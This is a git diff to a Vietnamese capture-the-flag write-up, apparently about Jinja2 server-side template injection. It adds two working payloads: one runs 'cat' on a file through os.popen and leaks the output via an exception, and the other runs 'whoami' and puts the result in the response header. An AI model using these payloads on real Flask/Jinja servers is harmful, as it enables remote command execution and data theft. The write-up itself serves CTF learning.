@@ -84,5 +84,14 @@ Mình có thực hiện mã hóa base64 để giúp đẩy code lên dễ hơn. 
 
 ![image](https://github.com/user-attachments/assets/27631e22-8c48-455e-afad-cc934c3df6cf)
 
+Ngoài ra còn 2 hướng nữa là:
+
+Lấy dữ liệu theo exception
+
+```{"template": "{%set res=lipsum.__globals__['os']['popen']('cat 7j6dlcuix63r').read()%}{{lipsum.__globals__['os'][res]()}}"}```
+
+Lấy dữ liệu đấy về response header
+
+```{{g.pop.__globals__.__builtins__.setattr(g.pop.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,"server_version",g.pop.__globals__.__builtins__.__import__('os').popen('whoami').read())}}```
 Oke vậy là đã thành công, giờ chỉ việc cat flag và submit thôi.
 
